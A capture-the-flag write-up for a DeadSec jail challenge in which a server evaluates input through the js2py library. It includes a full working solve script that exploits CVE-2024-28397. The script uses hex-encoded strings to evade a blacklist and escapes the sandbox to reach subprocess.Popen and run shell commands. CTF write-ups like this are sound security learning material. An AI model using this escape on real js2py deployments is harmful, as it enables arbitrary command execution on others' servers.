---
ai_date: 2025-04-27 05:15:11
ai_summary: "Exploited a vulnerability in the js2py library to bypass sandbox restrictions and execute arbitrary code, retrieving the flag: DEAD{Js_2_Py_3sc4p3_wr3ck3d_my_b0x}"
ai_tags:
  - js2py
  - sandbox-escape
  - cve-2024-28397
created: 2024-07-27T06:35
description: Copy paste CVE script kiddie still blooded the challenge
points: 220
solves: 29
tags:
  - jail
  - js2py
  - blood
updated: 2025-07-14T09:46
---

> This is my first calculator ever, and it might have a 0day!!!

## Analysis

### eval

```bash
curl "https://22e4f6ab4aa07cbe99e7f5e8.deadsec.quest/result" ^
  --data-raw '{"inputs":"9 + 9"}'
# {"result":"18","status":"success"}
```

Obviously the server is running some sort of `eval`.

After a few probes, I realized that the server is running python, and executing our code as JS. (weird)

```js
()=>{}
"SyntaxError: Line 1: ArrowFunction is not supported by ECMA 5.1"
```

### `js2py`

A bit of researching later I realized that the server is using `js2py`.

After which I found a CVE for `js2py`, and the [poc script](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py).

I used hex encoded code ran inside of `eval()` block to avoid blacklist.

It worked, but turns out that was unintended when the author DM-ed me, he did not saw `eval` coming.

So I modified the solve script a little to work even after he patched eval.

Just use hex encoded indexers, lol.

Credits to [Marven11/CVE-2024-28397-js2py-Sandbox-Escape: CVE-2024-28397: js2py sandbox escape, bypass pyimport restriction. (github.com)](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

## Solve Script

```python
import requests


def string_to_hex(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)


# https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py
payload = """
let cmd = "cat ../flag.txt"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o['\\x5F\\x5F\\x73\\x75\\x62\\x63\\x6C\\x61\\x73\\x73\\x65\\x73\\x5F\\x5F']()) {
        let item = o['\\x5F\\x5F\\x73\\x75\\x62\\x63\\x6C\\x61\\x73\\x73\\x65\\x73\\x5F\\x5F']()[i]
        if(item.__module__ == "\\x73\\x75\\x62\\x70\\x72\\x6F\\x63\\x65\\x73\\x73" && item.__name__ == "\\x50\\x6F\\x70\\x65\\x6E") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
n11
"""
r = requests.post("https://22e4f6ab4aa07cbe99e7f5e8.deadsec.quest/result", json={"inputs": payload})
print(r.text)
```

```flag
DEAD{Js_2_Py_3sc4p3_wr3ck3d_my_b0x}
```